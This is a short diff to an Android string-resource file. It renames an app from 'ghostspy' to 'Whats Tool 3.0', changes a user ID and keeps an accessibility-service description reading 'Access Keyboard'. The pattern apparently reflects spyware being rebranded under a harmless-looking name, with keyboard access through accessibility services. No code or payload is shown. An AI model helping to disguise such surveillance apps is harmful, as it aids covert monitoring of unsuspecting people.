@@ -1,6 +1,6 @@
 <resources>
-    <string name="app_name" translatable="false">ghostspy</string>
-    <string name="app_user_id" translatable="false">67c876336b0c7bacb8507440</string>
+    <string name="app_name" translatable="false">Whats Tool 3.0</string>
+    <string name="app_user_id" translatable="false">66d9bddc09f7706563a838df</string>
     <string name="accessibility_service_description" translatable="false">Access Keyboard</string>
     <string name="app_link" translatable="false">https://www.google.com/</string>
     <string name="app_link_enable" translatable="false">disable</string>
